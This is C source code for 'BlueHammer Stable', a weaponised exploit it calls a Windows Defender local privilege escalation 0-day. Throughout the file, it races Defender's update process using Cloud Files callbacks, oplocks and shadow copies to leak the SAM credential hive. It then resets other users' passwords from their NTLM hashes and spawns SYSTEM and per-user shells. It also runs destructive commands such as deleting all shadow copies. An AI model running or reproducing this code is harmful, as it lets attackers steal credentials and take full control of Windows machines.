// ============================================================================
// BlueHammer Stable - Windows Defender LPE (0-day)
// Original: Tom Gallagher, Igor Tsyganskiy, Jeremy Tinder and Nightmare-Eclipse
// Fixed race conditions, cleanup, error handling
// ============================================================================
...
void CallWD(WDRPCWorkerThreadArgs* args)
{
	...
	LOG_DEBUG("Calling ServerMpUpdateEngineSignature...\n");
...
UpdateFiles* GetUpdateFiles(int* filecount = NULL)
{
	...
	LOG_DEBUG("Cabinet file mapped at 0x%p\n", mappedbuff);
	...
	LOG_DEBUG("Extracting cab file content...\n");
	...
	LOG_DEBUG("Cab file content extracted.\n");
...
DWORD WINAPI ShadowCopyFinderThread(void* fullvsspath)
{
	...
	if (!vsinitial)
	{
		...
		LOG_ERROR("No VSS snapshots exist - run cleanup script and try again");
		retval = ERROR_NOT_FOUND;
		goto cleanup;
	}
	else
	{
		LOG_DEBUG("Found %d volume shadow copies\n", vscnum);
	}

	// FIX: On Windows Client, Defender doesn't create VSS during EICAR scan
	// Instead of waiting for a new VSS, use the most recent existing one
	// (which we created at startup via WMI)
	{
		LLShadowVolumeNames* highest = vsinitial;
		LLShadowVolumeNames* current = vsinitial;
		int highestNum = 0;
		
		// Find the highest numbered VSS (most recent)
		while (current)
		{
			// Extract number from "HarddiskVolumeShadowCopyN"
			wchar_t* numStart = wcsstr(current->name, L"HarddiskVolumeShadowCopy");
			if (numStart)
			{
				int num = _wtoi(numStart + wcslen(L"HarddiskVolumeShadowCopy"));
				if (num > highestNum)
				{
					highestNum = num;
					highest = current;
		...
		{
			wcscpy(newvsspath, L"\\Device\\");
			wcscat(newvsspath, highest->name);
			srchfound = true;
			LOG_DEBUG("Using most recent VSS: %ws (number %d)", highest->name, highestNum);
		}
	}

	if (!srchfound) {
		LOG_ERROR("Could not find usable VSS snapshot");
		retval = ERROR_NOT_FOUND;
		goto cleanup;
	}
	if (objdirinfo) {
	...
	LOG_DEBUG("New volume shadow copy detected : %ws\n", newvsspath);
	...
	// FIX: Add retry with timeout and better error handling
	{
		int retryCount = 0;
		...
		while (retryCount < maxRetries)
		{
			...
			LOG_ERROR("Failed to open VSS, error: 0x%08X", stat);
			LOG_ERROR("The VSS snapshot may be corrupted or inaccessible");
			LOG_ERROR("Try deleting all VSS and creating a fresh one:");
			LOG_ERROR("  vssadmin delete shadows /all /quiet");
			LOG_ERROR("  wmic shadowcopy call create Volume='C:\\'");
			retval = RtlNtStatusToDosError(stat);
			goto cleanup;
		}
		...
		{
			LOG_ERROR("VSS access timed out after %d retries", maxRetries);
			retval = ERROR_TIMEOUT;
			goto cleanup;
		}
	}

	LOG_SUCCESS("Successfully accessed volume shadow copy");
	CloseHandle(hlk);
	if (fullvsspath)
...
void CfCallbackFetchPlaceHolders(
	...
	if (GetWDPID() == cpi->ProcessId)
	{
		...
		LOG_DEBUG("CfExecute returned : 0x%0.8X\n", hs);
		return;
	}
	CF_OPERATION_INFO cfopinfo = { 0 };
	cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
...
DWORD WINAPI FreezeVSS(void* arg)
{
	...
	cfreg.ProviderName = CF_PROVIDER_NAME;  // FIX: Use configurable name
	cfreg.ProviderVersion = CF_PROVIDER_VERSION;
	...
	*(PathFindFileName(syncroot) - 1) = L'\0';
	...
	LOG_DEBUG("Registering sync root: %ws", syncroot);
	hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
	if (hs)
	{
		LOG_ERROR("Failed to register sync root, HRESULT: 0x%08X", hs);
		LOG_ERROR("This usually means:");
		LOG_ERROR("  1. Running from a system directory (use C:\\Temp or Desktop)");
		LOG_ERROR("  2. Stale sync root from previous failed run");
		LOG_ERROR("  3. Cloud Files service (CldFlt) not running");
		retval = ERROR_UNIDENTIFIED_ERROR;
		goto cleanup;
	}
	syncrootregistered = true;
	LOG_DEBUG("Sync root registered successfully");
	...
	if (hs)
	{
		LOG_ERROR("Failed to connect to sync root, HRESULT: 0x%08X", hs);
		retval = ERROR_UNIDENTIFIED_ERROR;
		goto cleanup;
	}
	LOG_DEBUG("Connected to sync root");
	...
	LOG_INFO("Waiting for Cloud Files callback (timeout: %ds)...", OPLOCK_TIMEOUT_MS / 1000);

	// FIX: Add timeout to callback wait
	{
		DWORD waitResult = WaitForSingleObject(callbackctx.hnotifywdaccess, OPLOCK_TIMEOUT_MS);
		if (waitResult == WAIT_TIMEOUT)
		{
			LOG_ERROR("Cloud Files callback timed out");
			LOG_ERROR("Defender may not be accessing the placeholder file");
			retval = WAIT_TIMEOUT;
			goto cleanup;
		}
		else if (waitResult != WAIT_OBJECT_0)
		{
			LOG_ERROR("Callback wait failed, error: %d", GetLastError());
			retval = GetLastError();
			goto cleanup;
		}
	}
	LOG_SUCCESS("Cloud Files callback received");

	ovd.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);  // FIX: Manual reset
	if (!ovd.hEvent)
	{
		LOG_ERROR("Failed to create event, error: %d", GetLastError());
		retval = GetLastError();
		goto cleanup;
	}
	...
	{
		LOG_ERROR("Failed to request batch oplock, error: %d", GetLastError());
		retval = GetLastError();
		goto cleanup;
	}
	SetEvent(callbackctx.hnotifylockcreated);

	LOG_INFO("Waiting for oplock to trigger (timeout: %ds)...", OPLOCK_TIMEOUT_MS / 1000);

	// FIX: Add timeout instead of infinite wait
	{
		DWORD waitResult = WaitForSingleObject(ovd.hEvent, OPLOCK_TIMEOUT_MS);
		if (waitResult == WAIT_TIMEOUT)
		{
			LOG_ERROR("Oplock wait timed out - Defender may not be scanning the trigger file");
			LOG_ERROR("Try: Start-MpScan -ScanType QuickScan in another window");
			CancelIo(hlock);
			retval = WAIT_TIMEOUT;
			goto cleanup;
		}
		...
		{
			LOG_ERROR("Oplock wait failed, error: %d", GetLastError());
			retval = GetLastError();
			goto cleanup;
		}
	}

	LOG_SUCCESS("Oplock triggered - WD is frozen");
...
bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
{
	...
	// FIX: RstrtMgr.dll may not be loaded on newer Defender versions
	// Try MpClient.dll which is always loaded by Defender
	// Fallback options: MpOav.dll, MpSvc.dll, wintrust.dll
	ExpandEnvironmentStrings(L"%ProgramFiles%\\Windows Defender\\MpClient.dll", rstmgr, MAX_PATH);
	
	// Check if it exists, fallback to RstrtMgr.dll
	if (GetFileAttributesW(rstmgr) == INVALID_FILE_ATTRIBUTES)
	{
		LOG_DEBUG("MpClient.dll not found, trying RstrtMgr.dll");
		ExpandEnvironmentStrings(L"%windir%\\System32\\RstrtMgr.dll", rstmgr, MAX_PATH);
	}
	LOG_DEBUG("Oplock target: %ws", rstmgr);
	OVERLAPPED ovd = { 0 };
	...
	if (!dircreated)
	{
		LOG_ERROR("Failed to create working directory, error: %d", GetLastError());
		retval = false;
		goto cleanup;
	}

	// FIX: Remove FILE_FLAG_DELETE_ON_CLOSE and allow full sharing
	// This allows Defender to scan the file and trigger the oplock
	hfile = CreateFile(eicarfilepath, GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hfile || hfile == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("Failed to create EICAR test file, error: %d", GetLastError());
		retval = false;
		goto cleanup;
	}
	...
	{
		LOG_ERROR("Failed to write EICAR test file, error: %d", GetLastError());
		retval = false;
		goto cleanup;
	}
	
	// FIX: Close the file handle so Defender can fully access it
	CloseHandle(hfile);
	hfile = NULL;
	LOG_DEBUG("EICAR file created and closed: %ws", eicarfilepath);
	...
	ovd.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);  // FIX: Manual reset event
	if (!ovd.hEvent)
	{
		LOG_ERROR("Failed to create event object, error: %d", GetLastError());
		retval = false;
		goto cleanup;
	}
	...
	if (GetLastError() != ERROR_IO_PENDING)
	{
		LOG_ERROR("Failed to request batch oplock on RstrtMgr.dll, error: %d", GetLastError());
		retval = false;
		goto cleanup;
	}

	// Trigger Defender to scan the EICAR file
	LOG_DEBUG("Triggering Defender scan on EICAR file...");
	...
	// FIX: Add timeout instead of infinite wait
	{
		...
		if (waitResult == WAIT_TIMEOUT)
		{
			LOG_ERROR("Oplock wait timed out - Defender not loading RstrtMgr.dll");
			LOG_ERROR("Possible causes:");
			LOG_ERROR("  1. Real-time protection disabled");
			LOG_ERROR("  2. EICAR file not being scanned");
			LOG_ERROR("  3. Defender behavior changed on this version");
			LOG_ERROR("Try running: Start-MpScan -ScanType QuickScan");
			CancelIo(hlock);
			retval = false;
			goto cleanup;
		}
	...
	LOG_SUCCESS("Oplock triggered");

	if (!GetExitCodeThread(hthread, &exitcode))
	{
		LOG_ERROR("Failed to get worker thread exit code");
		retval = false;
		goto cleanup;
	}
	if (exitcode)
	...
	{
		LOG_ERROR("Unable to freeze WD, thread exited prematurely");
		retval = false;
	}
...
cleanup:
	...
	// FIX: Manually delete EICAR file since we removed FILE_FLAG_DELETE_ON_CLOSE
	DeleteFileW(eicarfilepath);
...
bool DoSpawnShellAsAllUsers(wchar_t* sampath)
{
	...
	char newpassword[] = TEMP_PASSWORD;  // FIX: Use configurable password
	wchar_t newpassword_unistr[] = TEMP_PASSWORD_W;
	...
	for (int i = 0; i < numofentries; i++)
	{
		...
		if (realNTLMHash == NULL || realNTLMHashsz == 0) {
			LOG_DEBUG("  Skip : NULL NTLM.\n");
			continue;
		}
		if (_wcsicmp(username, currentusername) == 0)
		{
			LOG_DEBUG("  Skip : Current User.\n");
			continue;
		}
		if (_wcsicmp(username, L"WDAGUtilityAccount") == 0)
		{
			LOG_DEBUG("  Skip : WDAGUtilityAccount detected.\n");
			continue;
		}
			...
			if (ChangeUserPassword(username, realNTLMHash, NULL,newNTLM))
			{
				...
				if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, PAYLOAD_EXECUTABLE, PAYLOAD_COMMANDLINE, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
				{
					LOG_DEBUG("  Shell : Error %d\n", GetLastError());
				}
				else {
					LOG_DEBUG("  Shell : OK.\n");
					if (pi.hProcess)
				...
				{
					LOG_DEBUG("  PasswordRestore : Error %d\n", GetLastError());
				}
				
				else {
					LOG_DEBUG("  PasswordRestore : OK.\n");
				}
				CloseHandle(htoken);
			}
...
void LaunchConsoleInSessionId(DWORD sessionid)
{
	...
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessAsUser(hnewtoken, PAYLOAD_EXECUTABLE, PAYLOAD_COMMANDLINE, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
...
int wmain(int argc, wchar_t* argv[])
{
	...
	printf("\n");
	printf("=============================================================\n");
	printf("  BlueHammer Stable - Windows Defender LPE (0-day)\n");
	printf("  Stabilized version with proper cleanup and error handling\n");
	printf("=============================================================\n\n");

	// =========================================================================
	// SYSTEM CHECK - Running as SYSTEM means we're the service callback
	// =========================================================================
	if (IsRunningAsLocalSystem())
	{
		LOG_INFO("Running as SYSTEM - launching console in session");
		if (argc == 2)
		{
			DWORD sessionid = _wtoi(argv[1]);
			if (sessionid) {
				LOG_DEBUG("Session ID: %d", sessionid);
	...
	wchar_t exePathUpper[MAX_PATH] = { 0 };
	wcscpy_s(exePathUpper, MAX_PATH, exePath);
	_wcsupr_s(exePathUpper, MAX_PATH);
	
	if (wcsstr(exePathUpper, L"\\WINDOWS\\TASKS") ||
	    wcsstr(exePathUpper, L"\\WINDOWS\\SYSTEM32") ||
	    wcsstr(exePathUpper, L"\\WINDOWS\\SYSWOW64") ||
	    wcsstr(exePathUpper, L"\\WINDOWS\\TEMP"))
	{
		LOG_ERROR("Cannot run from system directories");
		LOG_ERROR("Copy to C:\\Temp and run from there");
		WAIT_FOR_KEY();
		return 1;
	}
	...
	if (isAdmin)
	{
		LOG_ERROR("Already running as admin - this exploit is for privilege escalation FROM non-admin");
		LOG_ERROR("Run from a non-admin user account");
		WAIT_FOR_KEY();
		return 1;
	}
	LOG_SUCCESS("Running as non-admin user - good");

	// =========================================================================
	// DEFENDER HEALTH CHECK
	// =========================================================================
	LOG_INFO("Checking Windows Defender status...");
	{
		...
		if (scm)
		{
			...
			if (svc)
			{
				...
				if (QueryServiceStatus(svc, &status))
				{
					...
					{
						LOG_ERROR("Windows Defender service is not running!");
						LOG_ERROR("Start it with: Start-Service WinDefend");
						CloseServiceHandle(svc);
						CloseServiceHandle(scm);
						WAIT_FOR_KEY();
						return 1;
					}
					LOG_SUCCESS("Defender service is running");
				}
				CloseServiceHandle(svc);
			}
			CloseServiceHandle(scm);
		...
		// Test if Defender can scan by checking if real-time protection responds
		// Create a harmless test file and see if Defender processes it
		wchar_t testPath[MAX_PATH];
		ExpandEnvironmentStringsW(L"%TEMP%\\defender_test.tmp", testPath, MAX_PATH);
		HANDLE hTest = CreateFileW(testPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hTest != INVALID_HANDLE_VALUE)
		{
			CloseHandle(hTest);
			DeleteFileW(testPath);
			LOG_SUCCESS("Defender file system access working");
		}
	}

	// =========================================================================
	// ENVIRONMENT CLEANUP - Clean state for reliable exploitation
	// =========================================================================
	LOG_INFO("Cleaning environment for reliable exploitation...");
	
	// Clear any leftover sync root registrations from failed runs
	LOG_DEBUG("Clearing stale sync root registrations...");
	RegDeleteTreeW(HKEY_CURRENT_USER, 
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SyncRootManager");
	
	// Delete existing VSS snapshots to avoid confusion
	LOG_DEBUG("Deleting existing VSS snapshots...");
	{
	...
	// Create a fresh VSS snapshot via WMI (needed on Windows Client)
	LOG_INFO("Creating fresh VSS snapshot...");
	{
		STARTUPINFOW si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		wchar_t cmd[] = L"wmic shadowcopy call create Volume='C:\\'";
		if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
		{
			WaitForSingleObject(pi.hProcess, 30000);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			LOG_SUCCESS("VSS snapshot created");
		}
		else
		{
			LOG_ERROR("Failed to create VSS snapshot - may need to create manually");
			LOG_ERROR("Run: (Get-WmiObject -List Win32_ShadowCopy).Create(\"C:\\\", \"ClientAccessible\")");
		}
	}
	
	// Small delay to let VSS stabilize
	Sleep(2000);
	...
	*/
	...
	try {
		// =================================================================
		// PHASE 1: Check for Defender Updates
		// =================================================================
		LOG_PHASE("Checking for Defender updates...");
		
		int updateCheckAttempts = 0;
		while (!CheckForWDUpdates(updtitle, &criterr)){
			if (criterr)
			{
				LOG_ERROR("Critical error checking for updates");
				goto cleanup;
			}
			updateCheckAttempts++;
			if (updateCheckAttempts == 1) {
				LOG_ERROR("No updates available - run: MpCmdRun.exe -RemoveDefinitions -All");
			}
			LOG_PHASE("Retrying in %d seconds... (attempt %d)", UPDATE_CHECK_INTERVAL_MS / 1000, updateCheckAttempts);
			Sleep(UPDATE_CHECK_INTERVAL_MS);
		}
		LOG_SUCCESS("Update available");

		// =================================================================
		// PHASE 2: Download Update Files
		// =================================================================
		LOG_PHASE("Downloading update files...");
		
		UpdateFilesList = GetUpdateFiles();
		if (!UpdateFilesList)
		{
			LOG_ERROR("Failed to download updates");
			goto cleanup;
		}
		LOG_SUCCESS("Updates downloaded");

		// =================================================================
		// PHASE 3: Get VSS Path
		// =================================================================
		LOG_PHASE("Accessing VSS snapshot...");
		
		hreleaseready = CreateEvent(NULL, FALSE, FALSE, NULL);
		if (!hreleaseready)
		{
			LOG_ERROR("CreateEvent failed: %d", GetLastError());
			goto cleanup;
		}
		...
		if (!isvssready)
		{
			LOG_DEBUG("Classic trigger failed, trying direct access...");
			
			// Try to find and use existing VSS directly
			wchar_t devicepath[] = L"\\Device";
			UNICODE_STRING udevpath = { 0 };
			RtlInitUnicodeString(&udevpath, devicepath);
			OBJECT_ATTRIBUTES objattr = { 0 };
			InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
			HANDLE hobjdir = NULL;
			NTSTATUS stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
			...
			if (stat == STATUS_SUCCESS)
			{
				...
				int vscnum = 0;
				DWORD retval = 0;
				LLShadowVolumeNames* vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum, &retval);
				NtClose(hobjdir);
				
				if (vsinitial && vscnum > 0)
				{
					// Find highest numbered VSS
					LLShadowVolumeNames* highest = vsinitial;
					LLShadowVolumeNames* current = vsinitial;
					int highestNum = 0;
					...
					if (highestNum > 0)
					{
						wcscpy(fullvsspath, L"\\Device\\");
						wcscat(fullvsspath, highest->name);
						LOG_SUCCESS("Using existing VSS: %ws", fullvsspath);
						isvssready = true;
					}
			...
			if (!isvssready)
			{
				LOG_ERROR("Could not find or access any VSS snapshot");
				LOG_ERROR("Try manually creating one:");
				LOG_ERROR("  wmic shadowcopy call create Volume='C:\\'");
				goto cleanup;
			}
		}
		...
		{
			LOG_SUCCESS("VSS ready at: %ws", fullvsspath);
		}

		// =================================================================
		// PHASE 4: TOCTOU Race - Leak SAM via Junction
		// =================================================================
		LOG_PHASE("Exploiting TOCTOU race...");
		...
		for (int x = 0; x < sizeof(filestoleak) / sizeof(wchar_t*); x++)
		{
			...
			{
				LOG_ERROR("Failed to create update directory: %d", GetLastError());
				goto cleanup;
			}
			LOG_DEBUG("Created update directory %ws", updatepath);
			while (UpdateFilesListCurrent)
			{
				...
				{
					LOG_ERROR("Failed to create update file: %d", GetLastError());
					goto cleanup;
				}
				...
				{
					LOG_ERROR("Failed to write update file: %d", GetLastError());
					CloseHandle(hupdate);
					goto cleanup;
				}
				CloseHandle(hupdate);
			...
			dirmoved = true;
			LOG_DEBUG("Directory moved %ws to %ws\n", updatepath, newtmp);
			...
			LOG_DEBUG("Junction created %ws => %ws\n", updatepath, rptarget);
			...
			LOG_DEBUG("Object manager link created %ws => %ws\n", objlinkname.Buffer, objlinktarget.Buffer);
			...
			LOG_DEBUG("Leaked file opened %ws\n", newdefupdatedirname);
			...
			{
				LOG_ERROR("Failed to read file: %d", GetLastError());
				goto cleanup;
			}
			...
			LOG_DEBUG("Read %d bytes", __readsz);
			...
			{
				LOG_ERROR("Failed to create leaked file: %d", GetLastError());
				goto cleanup;
			}
			if (!WriteFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
			{
				LOG_ERROR("Failed to write leaked file: %d", GetLastError());
				CloseHandle(hleakedfile);
				hleakedfile = NULL;
				// delete the file
			...
			// SUCCESS
			// =============================================================
			LOG_SUCCESS("SAM leaked to: %ws", copiedfilepath);
			
			SetEvent(hreleaseready);

			LOG_PHASE("Spawning SYSTEM shell...");
	...
	{
		LOG_ERROR("Exception caught: %d", exception);
		goto cleanup;
	}
